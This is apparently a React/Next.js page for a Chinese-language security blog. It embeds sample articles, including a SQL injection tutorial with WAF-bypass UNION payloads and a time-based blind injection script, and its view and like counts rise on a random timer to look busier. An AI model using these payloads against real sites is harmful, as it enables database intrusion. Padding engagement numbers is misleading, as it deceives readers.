"use client"

import { motion } from "framer-motion"
import { useRouter } from "next/navigation"
import { useEffect, useState } from "react"
import { useParams } from "next/navigation"
import type { WriteUp } from "../page"

// WriteUp 詳細內容數據庫
const writeupContents: { [key: string]: string } = {
  "advanced-sql-injection": `
# Advanced SQL Injection in Modern Web Applications

## 摘要

本文深入探討現代 Web 應用程式中的高級 SQL 注入技術，包括 WAF 繞過、盲注技巧和自動化工具開發。

## 1. 現代 WAF 繞過技術

### 1.1 編碼繞過
\`\`\`sql
-- URL 編碼繞過
%27%20UNION%20SELECT%20*%20FROM%20users--

-- 雙重編碼
%2527%2520UNION%2520SELECT%2520*%2520FROM%2520users--

-- Unicode 編碼
\\u0027\\u0020UNION\\u0020SELECT\\u0020*\\u0020FROM\\u0020users--
\`\`\`

### 1.2 註釋繞過
\`\`\`sql
-- MySQL 註釋繞過
/*!50000UNION*/ /*!50000SELECT*/ * FROM users

-- 內聯註釋
/*! UNION */ /*! SELECT */ * FROM users

-- 版本特定註釋
/*!50001 AND 1=1*/
\`\`\`

## 2. 盲注自動化技術

### 2.1 時間盲注
\`\`\`python
import requests
import time

def time_based_sqli(url, payload):
    start_time = time.time()
    response = requests.get(url + payload)
    end_time = time.time()
    
    return (end_time - start_time) > 5

# 測試 payload
payload = "' AND IF(1=1, SLEEP(5), 0)--"
if time_based_sqli(target_url, payload):
    print("SQL Injection 漏洞確認")
\`\`\`

## 3. 防護機制

### 3.1 參數化查詢
\`\`\`python
# 正確的參數化查詢
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))

# 錯誤的字符串拼接
cursor.execute(f"SELECT * FROM users WHERE username = '{username}'")
\`\`\`

## 4. 總結

現代 SQL 注入攻擊變得越來越複雜，需要多層防護策略。
  `,
  "quantum-cryptography-implementation": `
# Quantum Cryptography Implementation

## 摘要

本文詳細介紹量子密碼學的實現，包括量子金鑰分發（QKD）協議和後量子密碼學算法。

## 1. 量子金鑰分發基礎

### 1.1 BB84 協議實現
\`\`\`python
import numpy as np
import random

class BB84Protocol:
    def __init__(self):
        self.bases = ['+', 'x']  # 直線和對角線基
        self.bits = [0, 1]
        
    def generate_random_bits(self, n):
        return [random.choice(self.bits) for _ in range(n)]
    
    def generate_random_bases(self, n):
        return [random.choice(self.bases) for _ in range(n)]
\`\`\`

## 2. 後量子密碼學

### 2.1 格基密碼學
量子計算對傳統密碼學構成威脅，後量子密碼學提供解決方案。

## 3. 實際應用

量子密碼學在金融、政府和軍事領域有重要應用。
  `,
  // 可以繼續添加其他文章的內容...
}

// 模擬從數據庫獲取 WriteUp 數據
const getWriteUpById = (id: string): WriteUp | null => {
  const writeups: WriteUp[] = [
    {
      id: "advanced-sql-injection",
      title: "Advanced SQL Injection in Modern Web Applications",
      category: "Web Security",
      difficulty: "Expert",
      date: "2024-01-15",
      description: "深入分析現代 Web 應用程式中的高級 SQL 注入技術，包括 WAF 繞過、盲注技巧和自動化工具開發。",
      tags: ["SQL Injection", "WAF Bypass", "Web Security", "Penetration Testing"],
      readTime: "15 min",
      views: "12.5K",
      likes: "892",
      author: "Syan",
      metrics: {
        views: "12.5K",
        likes: "892",
      },
    },
    {
      id: "quantum-cryptography-implementation",
      title: "Quantum Cryptography Implementation",
      category: "Cryptography",
      difficulty: "Master",
      date: "2024-01-10",
      description: "實現量子密碼學協議，探討量子金鑰分發和後量子密碼學的實際應用。",
      tags: ["Quantum", "Cryptography", "QKD", "Post-Quantum"],
      readTime: "25 min",
      views: "8.7K",
      likes: "654",
      author: "Syan",
      metrics: {
        views: "8.7K",
        likes: "654",
      },
    },
    // 添加其他文章...
  ]

  return writeups.find((w) => w.id === id) || null
}

export default function WriteUpDetailPage() {
  const router = useRouter()
  const params = useParams()
  const slug = params?.slug as string
  const [isLoaded, setIsLoaded] = useState(false)
  const [isLiked, setIsLiked] = useState(false)
  const [isBookmarked, setIsBookmarked] = useState(false)

  const writeup = getWriteUpById(slug)

  const [viewCount, setViewCount] = useState(writeup ? Number.parseInt(writeup.metrics.views.replace("K", "000")) : 0)
  const [likeCount, setLikeCount] = useState(writeup ? Number.parseInt(writeup.metrics.likes) : 0)
  const [hasLiked, setHasLiked] = useState(false)

  useEffect(() => {
    if (writeup) {
      // Increment view count when page loads
      setViewCount((prev) => prev + 1)

      // Set up interval for simulating real-time updates
      const interval = setInterval(() => {
        // Randomly increment views
        if (Math.random() > 0.5) {
          setViewCount((prev) => prev + Math.floor(Math.random() * 3) + 1)
        }

        // Randomly increment likes
        if (Math.random() > 0.8 && !hasLiked) {
          setLikeCount((prev) => prev + 1)
        }
      }, 10000) // Update every 10 seconds

      return () => clearInterval(interval)
    }
  }, [writeup, hasLiked])

  // Format the view count for display
  const formattedViews = viewCount >= 1000 ? `${(viewCount / 1000).toFixed(1)}K` : viewCount.toString()

  const handleLike = () => {
    if (!hasLiked) {
      setLikeCount((prev) => prev + 1)
    } else {
      setLikeCount((prev) => Math.max(0, prev - 1))
    }
    setHasLiked(!hasLiked)
    setIsLiked(!isLiked)
  }

  useEffect(() => {
    setIsLoaded(true)
  }, [])

  const content = writeupContents[slug] || "內容正在準備中..."

  if (!writeup) {
    return (
      <div className="min-h-screen bg-black text-white flex items-center justify-center">
        <div className="text-center">
          <div className="text-6xl md:text-8xl mb-6">🔍</div>
          <h1 className="text-3xl md:text-4xl font-bold text-red-400 mb-4">404 - WriteUp 未找到</h1>
          <p className="text-gray-400 mb-6">您要找的文章可能已被移動或刪除</p>
          <div className="flex flex-col sm:flex-row gap-4 justify-center">
            <motion.button
              onClick={() => router.push("/writeups")}
              className="px-6 py-3 bg-orange-400 text-black rounded-lg font-mono hover:bg-orange-300 transition-colors"
              whileHover={{ scale: 1.05 }}
              whileTap={{ scale: 0.95 }}
            >
              返回 WriteUps 列表
            </motion.button>
            <motion.button
              onClick={() => router.push("/")}
              className="px-6 py-3 border border-green-400 text-green-400 rounded-lg font-mono hover:bg-green-400 hover:text-black transition-colors"
              whileHover={{ scale: 1.05 }}
              whileTap={{ scale: 0.95 }}
            >
              返回首頁
            </motion.button>
          </div>
        </div>
      </div>
    )
  }

  const getDifficultyColor = (difficulty: string) => {
    switch (difficulty) {
      case "Beginner":
        return "#00ff88"
      case "Intermediate":
        return "#0088ff"
      case "Expert":
        return "#ff0088"
      case "Master":
        return "#8800ff"
      default:
        return "#00ff88"
    }
  }

  const getCategoryColor = (category: string) => {
    const colors = {
      "Web Security": "#ff6b6b",
      Cryptography: "#4ecdc4",
      "Malware Analysis": "#45b7d1",
      "Exploit Development": "#f9ca24",
      "Blockchain Security": "#6c5ce7",
      "Binary Exploitation": "#fd79a8",
    }
    return colors[category as keyof typeof colors] || "#00ff88"
  }

  return (
    <div className="min-h-screen bg-black text-white">
      {/* 動態背景效果 */}
      <div className="fixed inset-0 z-0">
        <div className="absolute inset-0 bg-gradient-to-br from-black via-gray-900 to-black" />
        {Array.from({ length: 40 }).map((_, i) => (
          <motion.div
            key={i}
            className="absolute w-1 h-1 bg-orange-400 rounded-full"
            style={{
              left: `${Math.random() * 100}%`,
              top: `${Math.random() * 100}%`,
            }}
            animate={{
              y: [0, -100],
              opacity: [0, 1, 0],
            }}
            transition={{
              duration: Math.random() * 5 + 3,
              repeat: Number.POSITIVE_INFINITY,
              delay: Math.random() * 2,
            }}
          />
        ))}
      </div>

      {/* 頂部導航欄 */}
      <div className="fixed top-0 left-0 right-0 z-50 bg-black/90 backdrop-blur-xl border-b border-orange-400/30">
        <div className="max-w-7xl mx-auto px-4 md:px-6 py-3 md:py-4 flex items-center justify-between">
          <div className="flex items-center gap-4">
            <motion.button
              className="px-4 md:px-6 py-2 md:py-3 bg-black/60 border border-orange-400/50 rounded-full text-orange-400 hover:text-black hover:bg-orange-400 transition-all duration-300 font-mono text-sm md:text-base"
              onClick={() => router.push("/writeups")}
              whileHover={{ scale: 1.05 }}
              whileTap={{ scale: 0.95 }}
            >
              ← WriteUps
            </motion.button>

            <motion.button
              className="px-4 md:px-6 py-2 md:py-3 bg-black/60 border border-green-400/50 rounded-full text-green-400 hover:text-black hover:bg-green-400 transition-all duration-300 font-mono text-sm md:text-base"
              onClick={() => router.push("/")}
              whileHover={{ scale: 1.05 }}
              whileTap={{ scale: 0.95 }}
            >
              🏠 首頁
            </motion.button>
          </div>

          {/* 互動按鈕 */}
          <div className="flex items-center gap-2 md:gap-4">
            <motion.button
              className={`p-2 md:p-3 rounded-full transition-all duration-300 ${
                isLiked
                  ? "bg-red-500 text-white"
                  : "bg-black/60 border border-red-400/50 text-red-400 hover:bg-red-400 hover:text-black"
              }`}
              onClick={handleLike}
              whileHover={{ scale: 1.1 }}
              whileTap={{ scale: 0.9 }}
            >
              ❤️
            </motion.button>

            <motion.button
              className={`p-2 md:p-3 rounded-full transition-all duration-300 ${
                isBookmarked
                  ? "bg-yellow-500 text-black"
                  : "bg-black/60 border border-yellow-400/50 text-yellow-400 hover:bg-yellow-400 hover:text-black"
              }`}
              onClick={() => setIsBookmarked(!isBookmarked)}
              whileHover={{ scale: 1.1 }}
              whileTap={{ scale: 0.9 }}
            >
              🔖
            </motion.button>

            <motion.button
              className="p-2 md:p-3 bg-black/60 border border-blue-400/50 rounded-full text-blue-400 hover:bg-blue-400 hover:text-black transition-all duration-300"
              onClick={() => {
                if (navigator.share) {
                  navigator.share({
                    title: writeup.title,
                    text: writeup.description,
                    url: window.location.href,
                  })
                } else {
                  navigator.clipboard.writeText(window.location.href)
                  alert("連結已複製到剪貼板！")
                }
              }}
              whileHover={{ scale: 1.1 }}
              whileTap={{ scale: 0.9 }}
            >
              📤
            </motion.button>
          </div>
        </div>
      </div>

      {/* 主要內容 */}
      <div className="relative z-10 pt-20 md:pt-24 pb-12 px-4 md:px-6">
        <div className="max-w-4xl mx-auto">
          {/* 文章標題區域 */}
          <motion.div
            className="mb-8 md:mb-12"
            initial={{ opacity: 0, y: 50 }}
            animate={{ opacity: isLoaded ? 1 : 0, y: isLoaded ? 0 : 50 }}
            transition={{ duration: 1 }}
          >
            {/* 分類和難度標籤 */}
            <div className="flex flex-wrap items-center gap-3 md:gap-4 mb-4 md:mb-6">
              <span
                className="px-4 py-2 text-white rounded-full border font-mono text-sm md:text-base"
                style={{
                  backgroundColor: getCategoryColor(writeup.category),
                  borderColor: getCategoryColor(writeup.category),
                }}
              >
                {writeup.category}
              </span>
              <span
                className="px-4 py-2 text-white rounded-full font-mono font-bold text-sm md:text-base"
                style={{
                  backgroundColor: getDifficultyColor(writeup.difficulty),
                  boxShadow: `0 0 15px ${getDifficultyColor(writeup.difficulty)}50`,
                }}
              >
                {writeup.difficulty}
              </span>
            </div>

            {/* 標題 */}
            <motion.h1
              className="text-3xl md:text-4xl lg:text-6xl font-black mb-4 md:mb-6 leading-tight"
              style={{
                background: "linear-gradient(45deg, #ff8800, #ff0088, #8800ff)",
                backgroundSize: "200% 200%",
                WebkitBackgroundClip: "text",
                WebkitTextFillColor: "transparent",
                backgroundClip: "text",
                textShadow: "0 0 30px rgba(255, 136, 0, 0.5)",
              }}
              animate={{
                backgroundPosition: ["0% 50%", "100% 50%", "0% 50%"],
              }}
              transition={{
                duration: 3,
                repeat: Number.POSITIVE_INFINITY,
                ease: "linear",
              }}
            >
              {writeup.title}
            </motion.h1>

            {/* 元數據 */}
            <div className="flex flex-wrap items-center gap-4 md:gap-6 text-orange-300 font-mono mb-4 md:mb-6 text-sm md:text-base">
              <span>📅 {writeup.date}</span>
              <span>⏱ {writeup.readTime}</span>
              <span>👁 {formattedViews}</span>
              <span>❤️ {likeCount}</span>
              {writeup.author && <span>✍️ {writeup.author}</span>}
            </div>

            {/* 標籤 */}
            <div className="flex flex-wrap gap-2">
              {writeup.tags.map((tag: string) => (
                <span
                  key={tag}
                  className="px-3 py-1 bg-gray-800/50 text-gray-300 text-sm rounded border border-gray-600/30 font-mono"
                >
                  #{tag}
                </span>
              ))}
            </div>
          </motion.div>

          {/* 文章內容 */}
          <motion.div
            className="prose prose-invert prose-orange max-w-none"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ duration: 1, delay: 0.5 }}
          >
            <div className="bg-black/60 backdrop-blur-xl border border-orange-400/30 rounded-xl p-6 md:p-8">
              <div
                className="text-orange-100 leading-relaxed"
                style={{
                  fontFamily: 'Consolas, Monaco, "Courier New", monospace',
                  lineHeight: "1.8",
                }}
                dangerouslySetInnerHTML={{
                  __html: content
                    .replace(
                      /```(\w+)?\n([\s\S]*?)```/g,
                      '<pre class="bg-gray-900 p-4 rounded-lg overflow-x-auto border border-gray-700 my-4"><code class="text-green-400 text-sm">$2</code></pre>',
                    )
                    .replace(
                      /`([^`]+)`/g,
                      '<code class="bg-gray-800 px-2 py-1 rounded text-green-400 text-sm">$1</code>',
                    )
                    .replace(
                      /^## (.*$)/gm,
                      '<h2 class="text-2xl md:text-3xl font-bold text-orange-400 mt-8 mb-4">$1</h2>',
                    )
                    .replace(
                      /^### (.*$)/gm,
                      '<h3 class="text-xl md:text-2xl font-bold text-orange-300 mt-6 mb-3">$1</h3>',
                    )
                    .replace(
                      /^# (.*$)/gm,
                      '<h1 class="text-3xl md:text-4xl font-bold text-orange-400 mt-8 mb-6">$1</h1>',
                    )
                    .replace(/\n\n/g, '</p><p class="mb-4 text-sm md:text-base">')
                    .replace(/^\* (.*$)/gm, '<li class="ml-4 mb-2">$1</li>')
                    .replace(/^- (.*$)/gm, '<li class="ml-4 mb-2">$1</li>'),
                }}
              />
            </div>
          </motion.div>

          {/* 文章底部互動區域 */}
          <motion.div
            className="mt-8 md:mt-12 bg-black/60 backdrop-blur-xl border border-orange-400/30 rounded-xl p-6 md:p-8"
            initial={{ opacity: 0, y: 30 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.8, delay: 1 }}
          >
            <div className="flex flex-col md:flex-row items-center justify-between gap-4">
              <div className="text-center md:text-left">
                <h3 className="text-lg md:text-xl font-bold text-orange-400 mb-2">喜歡這篇文章嗎？</h3>
                <p className="text-orange-300 text-sm md:text-base">分享給更多人，或者給我一個讚！</p>
              </div>

              <div className="flex items-center gap-3 md:gap-4">
                <motion.button
                  className={`px-4 md:px-6 py-2 md:py-3 rounded-lg font-mono transition-all duration-300 ${
                    isLiked
                      ? "bg-red-500 text-white"
                      : "bg-gradient-to-r from-red-400 to-pink-400 text-black hover:from-red-300 hover:to-pink-300"
                  }`}
                  onClick={handleLike}
                  whileHover={{ scale: 1.05 }}
                  whileTap={{ scale: 0.95 }}
                >
                  ❤️ {isLiked ? `已讚 (${likeCount})` : `讚 (${likeCount})`}
                </motion.button>

                <motion.button
                  className="px-4 md:px-6 py-2 md:py-3 bg-gradient-to-r from-blue-400 to-purple-400 text-black font-mono rounded-lg hover:from-blue-300 hover:to-purple-300 transition-all duration-300"
                  onClick={() => {
                    if (navigator.share) {
                      navigator.share({
                        title: writeup.title,
                        text: writeup.description,
                        url: window.location.href,
                      })
                    }
                  }}
                  whileHover={{ scale: 1.05 }}
                  whileTap={{ scale: 0.95 }}
                >
                  📤 分享
                </motion.button>
              </div>
            </div>
          </motion.div>

          {/* 相關文章推薦 */}
          <motion.div
            className="mt-12 md:mt-16"
            initial={{ opacity: 0, y: 50 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 1, delay: 1.2 }}
          >
            <h2 className="text-2xl md:text-3xl font-bold text-orange-400 mb-6 md:mb-8 text-center">相關文章推薦</h2>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              {/* 這裡可以添加相關文章的邏輯 */}
              <motion.div
                className="bg-black/60 backdrop-blur-xl border border-orange-400/30 rounded-xl p-6 cursor-pointer hover:border-orange-400/60 transition-all duration-300"
                onClick={() => router.push("/writeups/quantum-cryptography-implementation")}
                whileHover={{ scale: 1.02 }}
              >
                <h3 className="text-lg font-bold text-orange-400 mb-2">Quantum Cryptography Implementation</h3>
                <p className="text-orange-200 text-sm mb-3">
                  實現量子密碼學協議，探討量子金鑰分發和後量子密碼學的實際應用...
                </p>
                <div className="flex items-center justify-between text-xs text-orange-300">
                  <span>Cryptography</span>
                  <span>25 min</span>
                </div>
              </motion.div>

              <motion.div
                className="bg-black/60 backdrop-blur-xl border border-orange-400/30 rounded-xl p-6 cursor-pointer hover:border-orange-400/60 transition-all duration-300"
                onClick={() => router.push("/writeups")}
                whileHover={{ scale: 1.02 }}
              >
                <div className="text-center">
                  <div className="text-4xl mb-3">📚</div>
                  <h3 className="text-lg font-bold text-orange-400 mb-2">探索更多文章</h3>
                  <p className="text-orange-200 text-sm">查看所有技術文章和研究</p>
                </div>
              </motion.div>
            </div>
          </motion.div>
        </div>
      </div>
    </div>
  )
}
